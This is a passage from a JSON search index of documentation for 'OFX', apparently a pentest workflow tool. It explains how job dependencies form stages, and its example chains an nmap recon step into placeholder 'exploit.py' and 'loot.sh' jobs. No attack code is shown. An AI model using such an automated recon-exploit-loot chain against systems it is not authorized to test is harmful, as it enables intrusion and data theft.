    print(f\"Report saved to ${{ ctx.output_path }}/recon_report.md\")\n</code></pre>"},{"location":"guide/workflows/examples/#see-also","title":"See Also","text":"<ul> <li>Workflow Stages</li> <li>Dependencies</li> </ul>"},{"location":"guide/workflows/stages/","title":"Workflow Stages","text":"<p>Workflow stages define the execution order and parallelism of jobs in an OFX workflow. Each stage consists of one or more jobs that can run in parallel, followed by dependent stages.</p>"},{"location":"guide/workflows/stages/#how-stages-are-determined","title":"How Stages Are Determined","text":"<ul> <li>Jobs without <code>needs:</code> run in the first stage (in parallel)</li> <li>Jobs with <code>needs:</code> run after their dependencies complete</li> <li>Each new set of jobs with satisfied dependencies forms a new stage</li> </ul>"},{"location":"guide/workflows/stages/#example-sequential-and-parallel-stages","title":"Example: Sequential and Parallel Stages","text":"<pre><code>jobs:\n    recon:\n        steps:\n            - run: nmap {{ inputs.target }}\n    exploit:\n        needs: recon\n        steps:\n            - run: python exploit.py\n    loot:\n        needs: exploit\n        steps:\n            - run: ./loot.sh\n    notify:\n        needs: recon\n        steps:\n            - run: ./notify.sh\n</code></pre> <p>Stages: 1. <code>recon</code> (stage 1) 2. <code>exploit</code> and <code>notify</code> (stage 2, run in parallel) 3. <code>loot</code> (stage 3)</p>"},{"location":"guide/workflows/stages/#visualizing-stages","title":"Visualizing Stages","text":"<p>Use <code>ofx flow run &lt;workflow.yml&gt; --debug</code> to see stage breakdowns and job execution order.</p>"},{"location":"guide/workflows/stages/#best-practices","title":"Best Practices","text":"<ul> <li>Use <code>needs:</code> to control dependencies and avoid race conditions</li> <li>Only one interactive job per stage (see Interactive Mode)</li> <li>Group independent jobs for faster execution</li> </ul>"},{"location":"guide/workflows/stages/#see-also","title":"See Also","text":"<ul> <li>Workflow Examples</li> <li>Dependencies</li> </ul>"}]}